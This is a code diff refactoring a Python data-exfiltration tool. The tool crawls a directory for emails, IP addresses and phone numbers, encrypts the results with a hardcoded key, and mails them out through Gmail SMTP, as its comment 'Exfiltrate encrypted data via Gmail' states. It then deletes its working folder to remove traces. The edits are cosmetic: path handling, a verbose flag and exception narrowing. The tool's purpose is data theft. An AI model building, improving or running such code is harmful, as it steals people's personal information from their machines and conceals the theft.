@@ -8,7 +8,6 @@ If these terms are not acceptable to you, then do not use this tool.
 Built-in modules """
 import logging
 import os
-import pathlib
 import re
 import shutil
 import smtplib
@@ -21,6 +20,9 @@ from email.mime.text import MIMEText
 from hashlib import sha512
 # External modules #
 from cryptography.fernet import Fernet
+
+
+VERBOSE = True
 
 
 def create_attachment(path: Path, file: str) -> MIMEBase:
@@ -63,10 +65,9 @@ def smtp_handler(email_addr: str, secret: str, message: MIMEMultipart):
             session.login(email_addr, secret)
             # Sent the messages and end session #
             session.sendmail(email_addr, email_addr, message.as_string())
-            session.quit()
 
     # If socket or SMTP error occurs #
-    except (OSError, smtplib.SMTPException) as mail_err:
+    except smtplib.SMTPException as mail_err:
         print_err(f'SMTP error occurred: {mail_err}')
         logging.exception('SMTP error occurred: %s\n', mail_err)
 
@@ -172,7 +173,7 @@ def crypto_hash(path: Path):
             encrypted_text.write(encrypted)
 
     # If error occurs during file operation #
-    except (IOError, OSError) as io_err:
+    except OSError as io_err:
         print_err(f'Error occurred accessing hash files: {io_err}')
         logging.exception('Error occurred accessing hash files: %s\n', io_err)
 
@@ -188,9 +189,9 @@ def crypto_data(path: Path):
     key = b'UR58Mz1VHiGJa1_W42E4G0FD__Ihb4vevs3wmWhVtOc='
 
     # Iterate through files in path #
-    for file in os.scandir(str(path.resolve())):
-        # If the current item is dir #
-        if os.path.isdir(file.name):
+    for file in os.scandir(path):
+        # If the current item is dir, skip it #
+        if os.path.isdir(file):
             continue
 
         hash_path = path / 'sha_hashes.txt'
@@ -224,7 +225,7 @@ def crypto_data(path: Path):
                 hash_encrypt.write(f'\nEncrypted SHA:\n{str(e_sha)}\n\n\n')
 
         # If error occurs during file operation #
-        except (IOError, OSError) as io_err:
+        except OSError as io_err:
             print_err(f'Error occurred accessing hash files: {io_err}')
             logging.exception('Error occurred accessing hash files: %s\n', io_err)
 
@@ -241,19 +242,17 @@ def match_logger(re_obj: object, dir_path: str, file: str, path: Path, match_cou
     :return:  Updated match count.
     """
     try:
-        # If the OS is Windows #
-        if os.name == 'nt':
-            match_path = f'{dir_path}\\{file}'
-        # If the OS is Linux #
-        else:
-            match_path = f'{dir_path}/{file}'
-
+        # Set the match path and match log #
+        match_path = Path(dir_path) / file
         match_log = path / f'crawl_matches_{match_count}.txt'
 
         # Open the file, iterating line by line #
         with open(match_path, 'r', encoding='utf-8') as search_file:
             for line in search_file:
-                print(line)
+                # Print line if verbose mode is set #
+                if VERBOSE:
+                    print(line)
+
                 # If line matches a regular expression #
                 if re_obj.email.search(line) or re_obj.ip_addr.search(line) \
                 or re_obj.phone.search(line):
@@ -266,7 +265,7 @@ def match_logger(re_obj: object, dir_path: str, file: str, path: Path, match_cou
                         details.write(f'Match => {line}\n\n')
 
     # If error occurs during file operation #
-    except (IOError, OSError) as file_err:
+    except OSError as file_err:
         print_err('Error occurred during file operation to match log')
         logging.exception('Error occurred during file operation to match log: %s\n', file_err)
 
@@ -292,8 +291,7 @@ def size_check(log_name: Path, log_num: int, log_path: Path) -> tuple:
         if log_name.stat().st_size >= 10_000_000:
             # Increment log count and reformat name #
             log_num += 1
-            new_path = log_path / f'crawl_log_{log_num}.txt'
-            log_name = Path(str(new_path.resolve()))
+            log_name = log_path / f'crawl_log_{log_num}.txt'
 
     # If the log file does not exist yet #
     except FileNotFoundError:
@@ -365,12 +363,11 @@ def main():
     re_obj.phone = re.compile(r'(1?)(?:\s|^)\d{3}-\d{3}-\d{4}')
 
     # Ensure storage path for exfiltration data exists #
-    pathlib.Path(str(path.resolve())).mkdir(parents=True, exist_ok=True)
+    path.mkdir(parents=True, exist_ok=True)
     # Format the log file path #
     log_file = path / 'err_log.log'
-    # Initialize logging facilities #
     # Initialize the logging facilities #
-    logging.basicConfig(filename=str(log_file.resolve()), level=logging.DEBUG,
+    logging.basicConfig(filename=log_file, level=logging.DEBUG,
                         format='%(asctime)s line%(lineno)d::%(funcName)s[%(levelname)s]>>'
                         ' %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
     log_count = 1
@@ -378,7 +375,7 @@ def main():
     crawl_log = path / f'crawl_log_{log_count}.txt'
 
     # Iterate recursively through paths, directories, and files in path #
-    for dir_path, dir_names, file_names in os.walk(str(crawl_path.resolve())):
+    for dir_path, dir_names, file_names in os.walk(crawl_path):
         # Check if log file is within the set size limit, if not set new log file #
         crawl_log, log_count = size_check(crawl_log, log_count, path)
 
@@ -417,18 +414,16 @@ def main():
     crypto_hash(path)
     # Exfiltrate encrypted data via Gmail #
     send_email(path)
-
-    # Shutdown the logging facilities #
-    logging.shutdown()
-    # Delete any contents contained in path #
     try:
+        # Delete any contents contained in path #
         shutil.rmtree(path)
 
     # If unable to delete because being used by other process #
     except PermissionError as del_err:
         logging.exception('Error occurred deleting contents: %s\n', del_err)
 
-    print('\nAll Done!!')
+    if VERBOSE:
+        print('\n[!] All Done!!')
 
 
 if __name__ == '__main__':
@@ -437,6 +432,7 @@ if __name__ == '__main__':
 
     # If Ctrl + C is detected #
     except KeyboardInterrupt:
-        print('Ctrl+C detected .. exiting')
+        if VERBOSE:
+            print('Ctrl+C detected .. exiting')
 
     sys.exit(0)
